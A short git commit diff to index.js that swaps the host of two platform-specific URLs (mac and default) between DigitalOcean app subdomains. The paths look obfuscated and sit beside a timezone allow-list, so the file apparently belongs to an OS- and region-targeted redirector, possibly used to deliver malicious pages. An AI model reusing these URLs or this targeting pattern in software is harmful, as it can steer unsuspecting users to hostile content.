46a133be9a4b1ed4afa40c7b4a31ac12cb671a8a
paalakash <palaksh452@gmail.com>
2026-07-08 08:23:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://monkfish-app-e7o4y.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://monkfish-app-e7o4y.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://seashell-app-pvfgi.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://seashell-app-pvfgi.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
